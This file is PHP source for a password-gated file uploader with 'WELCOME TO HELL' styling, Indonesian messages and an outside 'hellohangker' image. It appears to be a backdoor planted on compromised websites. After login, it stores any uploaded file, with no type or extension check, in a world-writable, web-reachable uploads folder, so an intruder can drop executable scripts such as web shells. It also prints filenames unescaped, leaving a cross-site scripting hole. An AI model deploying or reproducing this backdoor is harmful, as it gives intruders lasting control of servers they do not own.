<?php
session_start();

$PASSWORD_HASH = '$2a$12$bdy1rRayQBv535aAiu1j2uMytbCb4HJUeuuWi5rIk6UJNmZtZ7DU2';


if (!isset($_SESSION['logged_in'])) {
    if (isset($_POST['password'])) {
        if (password_verify($_POST['password'], $PASSWORD_HASH)) {
            $_SESSION['logged_in'] = true;
            header("Location: ".$_SERVER['PHP_SELF']);
            exit;
        } else {
            $error = "‚ùå THE FUCK BRO?";
        }
    }

    // FORM LOGIN
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>IN HELL</title>
        <style>
            body {
                background: url('https://thoidai.org/hellohangker/satan.gif') no-repeat center center fixed;
                background-size: cover;
                font-family: Arial, sans-serif;
                color: white;
                text-align: center;
                padding-top: 150px;
            }
            form {
                background: rgba(0,0,0,0.6);
                display: inline-block;
                padding: 20px;
                border-radius: 10px;
            }
            input[type=password] {
                padding: 10px;
                width: 200px;
                border: none;
                margin-bottom: 10px;
            }
            button {
                padding: 10px 20px;
                border: none;
                background: crimson;
                color: #fff;
                cursor: pointer;
                border-radius: 5px;
            }
            button:hover { background: darkred; }
            .err { color: yellow; margin-bottom: 10px; }
        </style>
    </head>
    <body>
    <h2>WELCOME TO HELL</h2>
    <?php if(isset($error)) echo "<div class='err'>$error</div>"; ?>
    <form method="POST">
        <input type="password" name="password" placeholder="MASUKAN KATA KUNCI" required><br>
        <button type="submit">LOGIN</button>
    </form>
    </body>
    </html>
    <?php
    exit;
}


$uploadDir = __DIR__ . "/uploads/";
if (!is_dir($uploadDir)) mkdir($uploadDir, 0777, true);

$msg = '';
$files = array_diff(scandir($uploadDir), ['.','..']);

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $file = $_FILES['file'];
    $name = basename($file['name']);
    $target = $uploadDir . $name;

    if ($file['error'] !== 0) {
        $msg = "Upload error code: " . $file['error'];
    } elseif (move_uploaded_file($file['tmp_name'], $target)) {
        $msg = "‚ö° BERHASIL diupload ‚Üí $name";
        $files = array_diff(scandir($uploadDir), ['.','..']);
    } else {
        $msg = "üî• GAGAL memindahkan file!";
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Uploader + Password</title>
    <style>
        body {
            background: url('https://thoidai.org/hellohangker/satan.gif') no-repeat center center fixed;
            background-size: cover;
            font-family: Arial;
            color: #fff;
            text-align: center;
            padding: 50px;
        }
        form {
            background: rgba(0,0,0,0.5);
            padding: 20px;
            border-radius: 10px;
            display: inline-block;
            margin-bottom: 20px;
        }
        h2 { text-shadow: 2px 2px 5px #000; }
        button {
            padding: 10px 20px;
            background: crimson;
            border: none;
            color: white;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover { background: darkred; }
        a { color: yellow; }
        ul { display: inline-block; text-align: left; margin-top: 20px; }
    </style>
</head>
<body>

<h2>üìÅ Uploader (Protected)</h2>

<?php if($msg) echo "<p><b>$msg</b></p>"; ?>

<form method="POST" enctype="multipart/form-data">
    <input type="file" name="file" required><br><br>
    <button type="submit">UPLOAD</button>
</form>

<h3>üìÇ Files</h3>
<ul>
<?php foreach($files as $f): ?>
    <li><a href="uploads/<?php echo urlencode($f); ?>" target="_blank"><?php echo $f; ?></a></li>
<?php endforeach; ?>
</ul>

</body>
</html>
